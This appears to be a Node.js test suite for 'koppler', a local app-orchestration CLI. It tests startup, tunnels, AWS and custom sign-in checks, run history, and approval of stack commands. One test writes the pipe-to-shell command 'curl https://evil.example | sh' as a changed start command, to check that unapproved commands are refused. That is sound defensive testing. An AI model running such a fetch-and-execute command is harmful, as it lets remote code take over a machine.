import assert from 'node:assert/strict';
// Whatever a test started is stopped when the file ends, even after a failed assertion, so no port stays held.
const cleanups = [];
process.on('exit', () => cleanups.forEach(stopAll => stopAll()));
import { allowStack } from './allow.mjs';
import { freePorts, until } from './helpers.mjs';

// Ports the system says are free; the tunnel one has room after it, for the tunnel that moves.
const [crashy, upA, upB, tunA, tunB, runA, runB, agentA, agentB, leftA, leftB] = await freePorts(11), [tunnel] = await freePorts(1, { roomAfter: 2 });

// A process that hands over to another program (as the secrets wrapper does) is still the same run: status and stop must see it.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-alive-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  assert.match(koppler('run', 'handover', '--', 'sh', '-c', 'sleep 0.4; exec sleep 30'), /started handover/);
  // With a port, "started" means it answers: a crash during startup is reported with its log, not as started.
  assert.match(koppler('run', 'crashy', '--port', String(crashy), '--', 'sh', '-c', 'sleep 2; echo boom; exit 1'), new RegExp(`crashy exited before answering on port ${crashy}[\\s\\S]*boom`));
  await until('handover showing as running', () => /handover\s+running/.test(koppler('status')));
  assert.match(koppler('stop', 'handover'), /handover: stopped/);
  assert.doesNotMatch(koppler('status'), /handover\s+running/);
  // A worker that ignores the polite signal does not outlive its app.
  assert.match(koppler('run', 'stubborn', '--', 'sh', '-c', '(trap "" TERM; exec sleep 31339) & wait'), /started stubborn/);
  assert.match(koppler('stop', 'stubborn'), /stubborn: stopped \(killed after 8s\)/);
  assert.equal(spawnSync('pgrep', ['-f', 'sleep 31339']).status, 1);
  // With a readiness path, "started" waits for it: the port answers first, while /health still says 503.
  const [slow] = await freePorts(1);
  const server = wait => `const t = Date.now(); require('http').createServer((q, r) => { r.statusCode = Date.now() - t < ${wait} ? 503 : 200; r.end(); }).listen(${slow});`;
  assert.match(koppler('run', 'slow', '--port', String(slow), '--ready', '/health', '--', 'node', '-e', server(2500)), /waiting for slow to be ready at \/health…[\s\S]*started slow/);
  assert.match(koppler('stop', 'slow'), /slow: stopped/);
  // One that never gets ready is not reported as started, and says what it answers.
  env.KOPPLER_START_WAIT = '3';
  assert.match(koppler('run', 'slow', '--port', String(slow), '--ready', '/health', '--', 'node', '-e', server(600000)), /slow is running \(pid \d+\) but is not ready: it answers 503 at \/health after 3s/);
  delete env.KOPPLER_START_WAIT;
  assert.match(koppler('stop', 'slow'), /slow: stopped/);
  fs.rmSync(dir, { recursive: true });
  console.log('handover ok');
}
// koppler up: the apps a run needs, the called one first, each waited for; what already runs is kept.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-up-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  const app = port => ({ name: `App ${port}`, kind: 'other', start: `python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}` });
  { const stack = { envs: ['qa'], apps: { a: { ...app(upA), consumes: { b: { how: 'env', env: 'B_URL' } } }, b: app(upB) } }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  const out = koppler('up', 'a', 'b', '--cable', 'a:b');
  assert.ok(out.indexOf('started b') >= 0 && out.indexOf('started b') < out.indexOf('started a'), out);
  assert.match(out, /Up on QA\./);
  assert.match(koppler('up', 'a', 'b'), /a: already running[\s\S]*b: already running|b: already running[\s\S]*a: already running/);
  koppler('stop', '--all', '--yes');
}
// koppler up: two tunnels that want the same port. The one that moves takes its app with it, so the app never dials the other one's database.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uptunnel-')), bin = path.join(dir, 'bin');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir, PATH: `${bin}:${process.env.PATH}` };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  // A stand-in for the tunnel program: it listens where it is told to.
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(bin, 'cloudflared'), '#!/bin/sh\nfor last; do :; done\nexec python3 -m http.server "${last##*:}" --bind 127.0.0.1\n', { mode: 0o755 });
  const app = (port, tunnel) => ({ name: `App ${port}`, kind: 'other', start: `echo "DB_ADDR=\${DB_ADDR:-unset}"; exec python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}`, prereqs: [tunnel] });
  const stack = { envs: ['qa'], apps: { a: app(tunA, { tunnel: 'db-a.internal', port: tunnel }), b: app(tunB, { tunnel: 'db-b.internal', port: tunnel, env: 'DB_ADDR' }) } };
  fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack);
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  const r = koppler('up', 'a', 'b');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, new RegExp(`started tunnel-db-a-${tunnel}\\b`));
  assert.match(r.out, new RegExp(`started tunnel-db-b-${tunnel + 2}\\b`));
  const log = id => fs.readFileSync(path.join(dir, 'logs', `${id}.log`), 'utf8');
  assert.match(log('b'), new RegExp(`DB_ADDR=localhost:${tunnel + 2}\\b`));
  assert.match(log('a'), /DB_ADDR=unset/);
  koppler('stop', '--all', '--yes');
  console.log('moved tunnel ok');
}
// koppler up: an app that reads its settings from AWS is not started on an expired sign-in; the run says how to sign in instead.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upsso-')), bin = path.join(dir, 'bin');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir, PATH: `${bin}:${process.env.PATH}` };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  // A stand-in for the AWS command: signed in only while the file it looks for is there.
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(bin, 'aws'), `#!/bin/sh\n[ -f "${dir}/signed-in" ] || { echo "Token has expired and refresh failed" >&2; exit 255; }\ncat "${dir}/account" 2>/dev/null; exit 0\n`, { mode: 0o755 });
  const [port] = await freePorts(1);
  const stack = { envs: ['qa'], apps: { api: { name: 'Orders API', kind: 'other', start: `echo started > "${dir}/started"; exec python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}`, prereqs: [{ sso: 'acme-qa' }] } } };
  fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack);
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { api: { path: dir } } }));
  const refused = koppler('up', 'api');
  assert.equal(refused.code, 1, refused.out);
  assert.match(refused.out, /Sign in first: Orders API needs AWS \(acme-qa\) at start/);
  assert.match(refused.out, /aws sso login --profile acme-qa/);
  assert.equal(fs.existsSync(path.join(dir, 'started')), false, 'nothing was started');
  fs.writeFileSync(path.join(dir, 'signed-in'), '');
  const started = koppler('up', 'api');
  assert.equal(started.code, 0, started.out);
  assert.equal(fs.existsSync(path.join(dir, 'started')), true);
  koppler('stop', '--all', '--yes');
  // A sign-in that names its account: signed in to another one is refused like an expired one.
  stack.apps.api.prereqs = [{ sso: 'acme-qa', account: '222222222222' }];
  fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack);
  fs.rmSync(path.join(dir, 'started'));
  fs.writeFileSync(path.join(dir, 'account'), '111111111111\n');
  const wrong = koppler('up', 'api');
  assert.equal(wrong.code, 1, wrong.out);
  assert.match(wrong.out, /Orders API needs AWS \(acme-qa, account 222222222222\) at start, and the sign-in has expired or is on another account/);
  assert.equal(fs.existsSync(path.join(dir, 'started')), false, 'nothing was started');
  fs.writeFileSync(path.join(dir, 'account'), '222222222222\n');
  const right = koppler('up', 'api');
  assert.equal(right.code, 0, right.out);
  koppler('stop', '--all', '--yes');
  console.log('sign-in before start ok');
}
// koppler up: a sign-in the stack declares itself (not AWS) is checked the same way, once its command is allowed, and what it gives the app reaches it.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upsignin-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const [port] = await freePorts(1);
  const signIns = { 'acme-cloud': { what: 'Acme Cloud', check: `test -f "${dir}/signed-in"`, login: 'acme login --tenant shop', env: { ACME_TENANT: 'shop' } } };
  const stack = { envs: ['qa'], signIns, apps: { api: { name: 'Orders API', kind: 'other', start: `echo "TENANT=$ACME_TENANT" > "${dir}/started"; exec python3 -m http.server ${port} --bind 127.0.0.1`, url: `http://localhost:${port}`, prereqs: [{ signIn: 'acme-cloud' }] } } };
  fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify({ ...stack, source: path.join(dir, 'stack.json') }));
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { api: { path: dir } } }));
  // Its check is a command of the stack's: nothing runs until the user allowed it.
  const unseen = koppler('up', 'api');
  assert.equal(unseen.code, 1, unseen.out);
  assert.match(unseen.out, /koppler doctor --approve/);
  allowStack(dir, { ...stack, source: path.join(dir, 'stack.json') });
  const refused = koppler('up', 'api');
  assert.equal(refused.code, 1, refused.out);
  assert.match(refused.out, /Sign in first: Orders API needs Acme Cloud at start/);
  assert.match(refused.out, /acme login --tenant shop/);
  assert.equal(fs.existsSync(path.join(dir, 'started')), false, 'nothing was started');
  fs.writeFileSync(path.join(dir, 'signed-in'), '');
  const started = koppler('up', 'api');
  assert.equal(started.code, 0, started.out);
  assert.equal(fs.readFileSync(path.join(dir, 'started'), 'utf8').trim(), 'TENANT=shop');
  koppler('stop', '--all', '--yes');
  console.log('a stack sign-in before start ok');
}
// koppler up --run: a confirmed Send carried out by Koppler itself; a cable's address reaches its caller at start, and the run is done.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-uprun-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `echo "B_URL=$B_URL"; exec python3 -m http.server ${runA} --bind 127.0.0.1`, url: `http://localhost:${runA}`, consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${runB} --bind 127.0.0.1`, url: `http://localhost:${runB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000010', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [{ id: 'a' }, { id: 'b' }], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000010');
  assert.equal(r.code, 0, r.out);
  assert.ok(r.out.indexOf('started b') < r.out.indexOf('started a'), r.out);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), new RegExp(`B_URL=http://localhost:${runB}\\b`));
  assert.match(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  // What happened since the last Stop is gathered on demand, for a bug report: the run, and its files on this Mac.
  const session = koppler('history', '--session');
  assert.equal(session.code, 0, session.out);
  assert.match(session.out, /1 runs: 1 done\./);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(dir, 'sessions', 'current', 'runs.json'), 'utf8')).map(run => run.id), ['run000010']);
  koppler('stop', '--all', '--yes');
}
// From the terminal or chat: every up is recorded as a run, added to what already runs, with its cables wired.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upchat-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `echo "B_URL=$B_URL"; exec python3 -m http.server ${agentA} --bind 127.0.0.1`, url: `http://localhost:${agentA}`, consumes: { b: { how: 'env', env: 'B_URL' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${agentB} --bind 127.0.0.1`, url: `http://localhost:${agentB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  assert.equal(koppler('up', 'b', '--env', 'qa').code, 0);
  const r = koppler('up', 'a', '--cable', 'a:b');
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /b: already running/);
  assert.match(fs.readFileSync(path.join(dir, 'logs', 'a.log'), 'utf8'), new RegExp(`B_URL=http://localhost:${agentB}\\b`));
  const live = JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8'));
  assert.deepEqual([Object.keys(live.nodes).sort(), live.edges], [['a', 'b'], [{ from: 'a', to: 'b' }]]);
  assert.equal((fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8').match(/"event":"done"/g) ?? []).length, 2);
  assert.match(koppler('up', 'a', '--cable', 'a:nope').out, /usage: --cable/);
  koppler('stop', '--all', '--yes');
}
// A start command from the stack runs only once the user allowed it, and needs allowing again when it changes.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-approve-')), marker = path.join(dir, 'ran');
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env, input: '' }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const stackWith = start => ({ envs: ['qa'], apps: { api: { name: 'API', kind: 'other', start } } });
  const write = stack => fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack));
  const first = stackWith(`touch ${marker}; exec sleep 30`);
  write(first);
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { api: { path: dir } } }));
  for (const args of [['run', 'api'], ['up', 'api']]) {
    const r = koppler(...args);
    assert.equal(r.code, 1, r.out);
    assert.match(r.out, /command from the stack[\s\S]*koppler doctor --approve/);
  }
  assert.equal(fs.existsSync(marker), false, 'nothing ran before approval');
  // Only a person at a terminal can approve: not a script, not with --yes.
  const tried = koppler('doctor', '--approve', '--yes');
  assert.match(tried.out, /touch [\s\S]*not approved/);
  assert.equal(koppler('run', 'api').code, 1);
  allowStack(dir, first);
  assert.equal(koppler('run', 'api').code, 0);
  assert.equal(fs.existsSync(marker), true);
  koppler('stop', 'api');
  write(stackWith('curl https://evil.example | sh'));
  assert.match(koppler('run', 'api').out, /not allowed yet, or that changed since/);
  koppler('stop', '--all', '--yes');
}
// Something left for the agent: the apps still start, the board shows them running (live state), and the run stays open (exit 3).
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-upleft-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', '--all', '--yes'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return { out: (r.stdout + r.stderr).trim(), code: r.status }; };
  const apps = {
    a: { name: 'A', kind: 'other', start: `exec python3 -m http.server ${leftA} --bind 127.0.0.1`, url: `http://localhost:${leftA}`, consumes: { b: { how: 'unknown' } } },
    b: { name: 'B', kind: 'other', start: `exec python3 -m http.server ${leftB} --bind 127.0.0.1`, url: `http://localhost:${leftB}` },
  };
  { const stack = { envs: ['qa'], apps }; fs.writeFileSync(path.join(dir, 'registry.json'), JSON.stringify(stack)); allowStack(dir, stack); }
  fs.writeFileSync(path.join(dir, 'local.json'), JSON.stringify({ apps: { a: { path: dir }, b: { path: dir } } }));
  fs.writeFileSync(path.join(dir, 'history.jsonl'), JSON.stringify({ id: 'run000011', at: 't', kind: 'run', env: 'qa', nodes: { a: { run: 'cli' }, b: { run: 'cli' } }, edges: [{ from: 'a', to: 'b' }], plan: { starts: [], restarts: [], stops: [], keeps: [] } }) + '\n');
  const r = koppler('up', '--run', 'run000011');
  assert.equal(r.code, 3, r.out);
  assert.match(r.out, new RegExp(`Left for the agent:[\\s\\S]*A -> local B: point it at http://localhost:${leftB}\\b`));
  // The caller waits for its cable: started now it would call the deployed B, and need a restart after the edit.
  assert.match(r.out, /A is not started until then/);
  assert.doesNotMatch(r.out, /started a /);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['b']);
  assert.doesNotMatch(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  // The agent makes the change and logs it: the same run then starts the caller and is done, with nothing left.
  const logged = fs.existsSync(path.join(dir, 'actions.json')) ? JSON.parse(fs.readFileSync(path.join(dir, 'actions.json'), 'utf8')) : [];
  const edit = { kind: 'edit', app: 'a', file: path.join(dir, 'client.js'), before: 'const B = "https://b.acme.test";', after: `const B = "http://localhost:${leftB}"; // koppler: do not commit` };
  fs.writeFileSync(path.join(dir, 'actions.json'), JSON.stringify([...logged, edit]));
  const again = koppler('up', '--run', 'run000011');
  assert.equal(again.code, 0, again.out);
  assert.match(again.out, /started a /);
  assert.doesNotMatch(again.out, /Left for the agent/);
  assert.deepEqual(Object.keys(JSON.parse(fs.readFileSync(path.join(dir, 'live.json'), 'utf8')).nodes).sort(), ['a', 'b']);
  assert.match(fs.readFileSync(path.join(dir, 'history.jsonl'), 'utf8'), /"event":"done"/);
  koppler('stop', '--all', '--yes');
}
// stop --all: everything Koppler runs except the canvas, which stops with canvas stop.
{
  const { spawnSync } = await import('node:child_process');
  const fs = await import('node:fs'), os = await import('node:os'), path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-stopapps-'));
  const env = { ...process.env, KOPPLER_STATE: dir, KOPPLER_TEMP: dir, KOPPLER_CONFIG_DIR: dir };
  cleanups.push(() => spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), 'stop', 'canvas'], { env }));
  const koppler = (...args) => { const r = spawnSync('node', [path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs'), ...args], { encoding: 'utf8', env }); return (r.stdout + r.stderr).trim(); };
  koppler('run', 'canvas', '--', 'sleep', '30'); koppler('run', 'api', '--', 'sleep', '30'); koppler('run', 'tunnel-db-5432', '--', 'sleep', '30');
  const out = koppler('stop', '--all', '--yes');
  assert.match(out, /api: stopped/); assert.match(out, /tunnel-db-5432: stopped/); assert.doesNotMatch(out, /canvas/);
  assert.match(koppler('status'), /canvas\s+running/);
  assert.match(koppler('stop', '--apps'), /usage: koppler stop <name\.\.\.> \| --all/);
  // Not a run, so the history gets a note: afterwards it still says why nothing runs.
  assert.match(koppler('history'), /apps stopped, changes kept: (api, tunnel-db-5432|tunnel-db-5432, api)/);
  assert.match(koppler('canvas', 'stop'), /canvas: stopped/);
  assert.equal(koppler('plan'), 'No Send is waiting to be applied.');
}
// An action that is not one of the secrets commands gets the usage line, also when it is named like a built-in property.
{
  const { spawnSync } = await import('node:child_process');
  const path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
  for (const action of ['constructor', 'toString', 'bogus']) {
    const r = spawnSync('node', [entry, 'secret', action], { encoding: 'utf8' });
    assert.equal(r.status, 2, `${action}: ${r.stderr}`);
    assert.match(r.stderr, /^koppler: usage: koppler secret /, action);
  }
}
// A command that does not exist is unknown, also when it is named like a built-in property.
{
  const { spawnSync } = await import('node:child_process');
  const path = await import('node:path'), { fileURLToPath } = await import('node:url');
  const entry = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'dist', 'koppler.mjs');
  const koppler = (...args) => spawnSync('node', [entry, ...args], { encoding: 'utf8' });
  for (const name of ['constructor', 'toString', '__proto__']) {
    assert.match(koppler(name).stderr, new RegExp(`^koppler: unknown command "${name}"`), name);
    assert.equal(koppler(name, '--help').status, 2, name);
    const help = koppler('help', name);
    assert.equal(help.status, 2, name);
    assert.match(help.stderr, /^koppler: usage: no command /, name);
  }
}
